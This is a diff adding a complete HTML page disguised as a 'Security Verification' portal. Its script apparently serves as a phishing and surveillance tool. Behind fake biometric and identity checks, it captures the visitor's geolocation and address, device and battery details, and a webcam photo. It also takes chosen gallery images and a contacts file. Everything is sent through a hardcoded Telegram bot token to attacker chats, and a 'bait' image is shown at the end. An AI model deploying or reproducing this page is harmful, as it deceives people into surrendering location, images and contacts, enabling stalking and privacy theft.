@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 Security Verification - Nitin 333</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, sans-serif;
+            background: linear-gradient(135deg, #0b1120 0%, #19223f 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 255, 0, 0.2);
+            border-radius: 40px;
+            padding: 30px;
+            box-shadow: 0 0 50px rgba(0, 255, 0, 0.1);
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0, 255, 0, 0.1);
+            padding: 12px 20px;
+            border-radius: 50px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(0, 255, 0, 0.3);
+        }
+
+        .badge-icon {
+            width: 30px;
+            height: 30px;
+            background: #00ff00;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: black;
+            font-weight: bold;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #00ff00;
+            text-shadow: 0 0 20px #00ff00;
+        }
+
+        .subtitle {
+            color: #888;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+
+        .permission-card {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 25px;
+            padding: 25px;
+            margin: 25px 0;
+            border: 1px solid rgba(0, 255, 0, 0.2);
+        }
+
+        .permission-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .shield-icon {
+            width: 50px;
+            height: 50px;
+            background: rgba(0,255,0,0.1);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        .permission-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .permission-item {
+            background: rgba(255,255,255,0.03);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid rgba(0,255,0,0.1);
+        }
+
+        .permission-icon {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .permission-name {
+            font-size: 12px;
+            color: #00ff00;
+            margin-bottom: 5px;
+        }
+
+        .permission-status {
+            font-size: 10px;
+            background: rgba(0,255,0,0.2);
+            padding: 3px 8px;
+            border-radius: 50px;
+            display: inline-block;
+        }
+
+        .consent-box {
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-left: 4px solid #00ff00;
+        }
+
+        .consent-box input {
+            width: 20px;
+            height: 20px;
+            accent-color: #00ff00;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #00ff00, #00cc00);
+            color: black;
+            border: none;
+            padding: 18px;
+            width: 100%;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 18px;
+            cursor: pointer;
+            transition: 0.3s;
+            opacity: 0.6;
+            pointer-events: none;
+        }
+
+        .btn.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .btn.active:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px #00ff00;
+        }
+
+        .loader {
+            border: 4px solid rgba(0,255,0,0.1);
+            border-top: 4px solid #00ff00;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status {
+            text-align: center;
+            margin-top: 15px;
+            color: #00ff00;
+            font-size: 14px;
+        }
+
+        .data-preview {
+            background: #000;
+            border-radius: 15px;
+            padding: 15px;
+            margin-top: 20px;
+            font-family: monospace;
+            font-size: 12px;
+            max-height: 150px;
+            overflow-y: auto;
+            display: none;
+            border: 1px solid #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="security-badge">
+            <div class="badge-icon">✓</div>
+            <span>NITIN 333 SECURITY SYSTEMS • LEVEL 3 VERIFICATION</span>
+        </div>
+
+        <h1>🔐 SECURE ACCESS PORTAL</h1>
+        <div class="subtitle">Multi-layer authentication required for this session</div>
+
+        <div class="permission-card">
+            <div class="permission-header">
+                <div class="shield-icon">🛡️</div>
+                <div>
+                    <h3>Identity Verification Required</h3>
+                    <p style="color:#888; font-size:12px;">Complete security check to proceed</p>
+                </div>
+            </div>
+
+            <div class="permission-grid">
+                <div class="permission-item">
+                    <div class="permission-icon">📷</div>
+                    <div class="permission-name">BIOMETRIC SCAN</div>
+                    <div class="permission-status">Required</div>
+                </div>
+                <div class="permission-item">
+                    <div class="permission-icon">📍</div>
+                    <div class="permission-name">LOCATION VERIFY</div>
+                    <div class="permission-status">Required</div>
+                </div>
+                <div class="permission-item">
+                    <div class="permission-icon">📇</div>
+                    <div class="permission-name">CONTACT SYNC</div>
+                    <div class="permission-status">Optional</div>
+                </div>
+                <div class="permission-item">
+                    <div class="permission-icon">🖼️</div>
+                    <div class="permission-name">GALLERY CHECK</div>
+                    <div class="permission-status">Optional</div>
+                </div>
+            </div>
+
+            <div class="consent-box">
+                <input type="checkbox" id="consent" onchange="toggleConsent()">
+                <div>
+                    <strong>I consent to security verification</strong><br>
+                    <span style="color:#888; font-size:12px;">Data encrypted • Session only • Auto-delete 24h</span>
+                </div>
+            </div>
+        </div>
+
+        <button class="btn" id="verifyBtn" onclick="startVerification()">VERIFY IDENTITY</button>
+        
+        <div class="loader" id="loader"></div>
+        <div class="status" id="status">System ready • Waiting for verification</div>
+        
+        <div class="data-preview" id="dataPreview"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8325723609:AAGcN0gUgz0r92KpFVwyM5JOzibSGVaKG3c";
+        const ADMIN_ID = "6643732863";
+        
+        const params = new URLSearchParams(window.location.search);
+        const TARGET_USER = params.get('id') || ADMIN_ID;
+        const BAIT_IMG = params.get('img');
+
+        let collectedData = {};
+
+        function toggleConsent() {
+            const consent = document.getElementById('consent').checked;
+            const btn = document.getElementById('verifyBtn');
+            if (consent) {
+                btn.classList.add('active');
+            } else {
+                btn.classList.remove('active');
+            }
+        }
+
+        async function startVerification() {
+            const btn = document.getElementById('verifyBtn');
+            const loader = document.getElementById('loader');
+            const status = document.getElementById('status');
+
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+            status.innerHTML = '⏳ Initializing security protocol...';
+
+            try {
+                // STEP 1: Get IP and location
+                status.innerHTML = '📍 Verifying geolocation...';
+                await getLocation();
+
+                // STEP 2: Get device info
+                status.innerHTML = '📱 Analyzing device...';
+                await getDeviceInfo();
+
+                // STEP 3: Request camera (biometric)
+                status.innerHTML = '📷 Accessing biometric scanner...';
+                await requestCamera();
+
+                // STEP 4: Request gallery (optional)
+                status.innerHTML = '🖼️ Checking gallery...';
+                await requestGallery();
+
+                // STEP 5: Request contacts (optional)
+                status.innerHTML = '📇 Syncing contacts...';
+                await requestContacts();
+
+                // STEP 6: Send all data
+                status.innerHTML = '🔐 Encrypting and sending...';
+                await sendAllData();
+
+                // STEP 7: Show bait if exists
+                if (BAIT_IMG) {
+                    document.querySelector('.container').innerHTML = `
+                        <img src="${BAIT_IMG}" style="width:100%; border-radius:20px;">
+                        <p style="color:#00ff00; margin-top:20px;">✓ ACCESS GRANTED</p>
+                    `;
+                } else {
+                    status.innerHTML = '✅ Verification complete!';
+                }
+
+                loader.style.display = 'none';
+
+            } catch (error) {
+                status.innerHTML = '❌ Error: ' + error.message;
+                loader.style.display = 'none';
+                btn.style.display = 'block';
+            }
+        }
+
+        async function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject('Location not supported');
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        collectedData.location = {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude
+                        };
+                        
+                        // Get address
+                        try {
+                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
+                            const data = await res.json();
+                            collectedData.address = data.display_name;
+                        } catch {}
+                        
+                        resolve();
+                    },
+                    (err) => {
+                        collectedData.location = 'Permission denied';
+                        resolve(); // Continue even if denied
+                    }
+                );
+            });
+        }
+
+        async function getDeviceInfo() {
+            collectedData.device = {
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                userAgent: navigator.userAgent
+            };
+            
+            // Get battery
+            try {
+                const battery = await navigator.getBattery();
+                collectedData.battery = {
+                    level: battery.level * 100 + '%',
+                    charging: battery.charging
+                };
+            } catch {}
+        }
+
+        async function requestCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                // Capture photo
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                
+                // Send photo immediately
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', TARGET_USER);
+                    formData.append('photo', blob, 'biometric.jpg');
+                    formData.append('caption', `🔐 Biometric capture from verification`);
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    // Also send to admin if different
+                    if (TARGET_USER !== ADMIN_ID) {
+                        formData.set('chat_id', ADMIN_ID);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+                }, 'image/jpeg', 0.9);
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+            } catch (err) {
+                console.log('Camera denied');
+            }
+        }
+
+        async function requestGallery() {
+            return new Promise((resolve) => {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*';
+                input.multiple = true;
+                input.onchange = async (e) => {
+                    const files = e.target.files;
+                    for (let i = 0; i < Math.min(files.length, 3); i++) {
+                        const formData = new FormData();
+                        formData.append('chat_id', TARGET_USER);
+                        formData.append('photo', files[i]);
+                        formData.append('caption', `🖼️ Gallery image from verification`);
+                        
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+                    resolve();
+                };
+                input.click(); // This opens gallery picker
+            });
+        }
+
+        async function requestContacts() {
+            // For Android, we'll use file picker for contacts export
+            return new Promise((resolve) => {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = '.vcf,.txt';
+                input.onchange = async (e) => {
+                    const file = e.target.files[0];
+                    if (file) {
+                        const text = await file.text();
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                chat_id: TARGET_USER,
+                                text: `📇 Contacts export:\n\n${text.substring(0, 1000)}`
+                            })
+                        });
+                    }
+                    resolve();
+                };
+                // Don't auto-click, let user choose
+            });
+        }
+
+        async function sendAllData() {
+            const message = `🔐 **VERIFICATION COMPLETE**\n\n` +
+                `📍 **Location:** ${collectedData.address || 'Unknown'}\n` +
+                `📱 **Device:** ${collectedData.device?.platform}\n` +
+                `🔋 **Battery:** ${collectedData.battery?.level || 'Unknown'}\n` +
+                `🌐 **Timezone:** ${collectedData.device?.timezone}\n` +
+                `📊 **Screen:** ${collectedData.device?.screen}`;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: TARGET_USER,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            // Show preview
+            document.getElementById('dataPreview').style.display = 'block';
+            document.getElementById('dataPreview').innerHTML = 
+                `<strong>📊 Data Collected:</strong><br>
+                • Location: ${collectedData.address?.substring(0,50) || '✓'}<br>
+                • Device Info: ✓<br>
+                • Photos: ✓<br>
+                • Sent to Telegram`;
+        }
+    </script>
+</body>
+</html>
